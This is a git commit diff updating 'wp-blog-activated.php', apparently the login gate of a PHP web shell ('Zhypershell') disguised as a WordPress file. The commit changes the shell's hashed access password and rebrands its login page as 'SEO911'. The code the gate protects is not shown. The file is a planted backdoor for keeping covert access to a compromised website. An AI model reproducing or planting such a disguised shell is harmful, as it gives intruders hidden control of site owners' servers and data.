6af5fe099c8a3d0f0444d285f097687a6f01806e
shujifine <nainaijulian@gmail.com>
2024-10-07 12:04:59 +0700

    Update wp-blog-activated.php

--- wp-blog-activated.php
+++ wp-blog-activated.php
@@ -1,112 +1,102 @@
 <?php
 session_start();
-$password = "2d0b3d70fa5f5b48c237276fb2e621a5";
+$password = "27dc4d96874bb6df9fde4ef5a097eb7e";
 
 function login_shell()
 {
 ?>
     <html>
-    <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zhypershell Login</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: url('https://zhyper-shel.info/imgzhyper/mek.jpg') no-repeat center center;
-            background-size: cover;
-            font-family: Arial, sans-serif;
-            overflow: hidden;
-        }
-
-        .login-container {
-            background: rgba(0, 0, 0, 0.7); /* Transparansi latar belakang form */
-            padding: 20px;
-            border-radius: 8px;
-            color: #fff;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-            margin-top: 720px;
-        }
-
-        .login-container input[type="password"] {
-            padding: 10px;
-            margin-right: 10px;
-            border: 1px solid #4e4e4e69;
-            border-radius: 4px;
-            background: transparent;
-            color: #fff;
-            outline: none;
-        }
-
-        .login-container input[type="password"]::placeholder {
-            color: #666666;
-        }
-
-        .login-container input[type="submit"] {
-            padding: 10px 20px;
-            border: none;
-            border-radius: 4px;
-            background: #4e4e4e69;
-            color: #000000;
-            cursor: pointer;
-            outline: none;
-        }
-
-        .login-container input[type="submit"]:hover {
-            background: #000;
-        }
-
-        .marquee-container {
-            position: fixed;
-            bottom: 0;
-            left: 500px;
-            right: 500px;
-            height: 50px;
-            overflow: hidden;
-            background: rgba(0, 0, 0, 0);
-            display: flex;
-            align-items: center;
-            color: #fff;
-        }
-
-        .marquee {
-            white-space: nowrap;
-            display: inline-block;
-            padding-left: 75%;
-            animation: marquee 10s linear infinite;
-        }
-
-        @keyframes marquee {
-            from {
-                transform: translateX(100%);
-            }
-            to {
-                transform: translateX(-100%);
-            }
-        }
-    </style>
-</head>
+<head>
+	<title>SEO911</title>
+    <link rel="shortcut icon" type="image/x-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlhWF814vNEkEgBk1g8F_bWOEGaGJwDNgwPlZjNxkCpgIBJL4GFhKPnQptuYtQ3ooTdOWVOvFgmja4b19N0QwfOYN9PcDf3klVXNJFTM1HwptCYQ6nAao_hoI15xfnjmi4P1r07w5ScKbeFvow65o2vpSGYBUBf-8ZyLgeK4LXT_ICKb_kkRCJ58Ih-cR7/s512/dg.png" />
+</head><l
 <body>
-    <div class="marquee-container">
-        <div class="marquee">
-            copyright © zhypershell
-        </div>
-    </div>
-    <div class="login-container">
-        <form action="" method="post">
-            <div align="center">
-                <input type="password" name="pass" placeholder="Password" required>
-                <input type="submit" name="submit" value="Login">
-            </div>
-        </form>
-    </div>
+<div class="login">
+    <h2 class="login-header">
+        SEO911
+    </h2>
+    <form class="login-container" action="" method="post">
+        <div align="center">
+            <input type="Password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value="LOGIN">
+          </div>
+    </form>
+</div>
 </body>
 </html>
+<style>
+body {
+    background: rgb(87, 87, 87);
+    font-family: 'Beautiful Vampires', sans-serif;
+    background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiFL6h6cTUiKmn-5H62NvzxZAFM3nAHMZQ_g90J5UovoYjnouxwXYfk6vxThzJiM1rT6Qaaak2jl_wWMl9q0WeNr_Li3lh5ZZzIib34KUEOlumXvj72zEhpQQOXtMXKCsDP-7n0JOqm7BCBh5WqwmGXP7ZDkrLYXVFwpbgkcMA55fkDbyDWHIdPll4jtpK8/s1919/seo911lagi.png);
+  }
+  .login {
+    width: 400px;
+    margin: 16px auto;
+    font-size: 16px;
+  }
+  /* Reset top and bottom margins from certain elements */
+  .login-header,
+  .login p {
+    margin-top: 0;
+    margin-bottom: 0;
+  }
+  .login-header {
+    background: #790000;
+    padding: 20px;
+    font-size: 1.4em;
+    font-weight: normal;
+    text-align: center;
+    text-transform: uppercase;
+    color: #fff;
+    border: 2px solid #ffca2d;
+  }
+  .login-container {
+    background: #2d2d2d;
+    padding: 12px;
+    border-radius: 10px 10px;
+  }
+  /* Every row inside .login-container is defined with p tags */
+  .login p {
+    padding: 12px;
+  }
+  .login input {
+    box-sizing: border-box;
+    display: block;
+    width: 100%;
+    border-width: 1px;
+    border-style: solid;
+    padding: 16px;
+    outline: 0;
+    font-family: inherit;
+    font-size: 0.95em;
+  }
+  .login input[type="email"],
+  .login input[type="password"] {
+    background: #e9e9e9;
+    border-color: #bbb;
+    color: #555;
+  }
+  /* Text fields' focus effect */
+  .login input[type="email"]:focus,
+  .login input[type="password"]:focus {
+    border-color: #888;
+  }
+  .login input[type="submit"] {
+    background: #790000;
+    border-color: transparent;
+    color: #fff;
+    cursor: pointer;
+    border: 2px solid #ffca2d;
+    border-radius: 5px 5px;
+  }
+  .login input[type="submit"]:hover {
+    background: #17c;
+  }
+  /* Buttons' focus effect */
+  .login input[type="submit"]:focus {
+    border-color: #05a;
+  }
+</style>
 <?php
     exit;
 }
